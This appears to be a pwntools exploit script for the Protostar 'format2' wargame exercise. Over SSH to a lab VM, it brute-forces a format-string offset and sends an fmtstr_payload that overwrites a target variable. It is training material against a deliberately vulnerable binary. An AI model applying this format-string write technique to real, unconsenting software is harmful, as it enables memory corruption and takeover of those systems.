#!/usr/bin/env python3
from pwn import *
context.update(arch='i386', os='linux')
context.bits =32


'''
user@protostar:/opt/protostar/bin$ objdump -t ./format2 | grep target
080496e4 g     O .bss   00000004              target
'''
def findOffset(lower=0, upper=8):
    foundRes = False
    b = log.progress("bytesWritten")
    o = log.progress("offset")
    context.log_level = 'error'
    result = ''
    dst = 0x080496e4
    val = 0x64
    bingo = 'you have modified'

    s = ssh(host='192.168.12.128', user='user', password='user')
    for offset in range(lower, upper):
        for bytesWritten in range(lower, upper):
            payload = fmtstr_payload(offset, {dst: val}, write_size='byte', numbwritten=bytesWritten)
            context.log_level = 'info'
            b.status(str(bytesWritten))
            o.status(str(offset))
            context.log_level = 'error'
            sh = s.run('/opt/protostar/bin/format2')
            sh.sendline(payload)
            result = sh.recvS()
            if bingo in result:
                context.log_level = 'info'
                log.info('offset={}, bytesWritten={}'.format(offset, bytesWritten))
                context.log_level = 'error'
                return
    s.close()

def exploit(offset, bytesWritten):
    dst = 0x080496e4
    val = 0x64
    s = ssh(host='192.168.12.128', user='user', password='user')
    payload = fmtstr_payload(offset, {dst: val}, write_size='byte', numbwritten=bytesWritten)
    print(payload)
    sh = s.run('/opt/protostar/bin/format2')
    sh.sendline(payload)
    result = sh.recvS()
    print(result)
    s.close()

#findOffset(0, 64)
offset = 4
bytesWritten = 36
exploit(offset, bytesWritten)


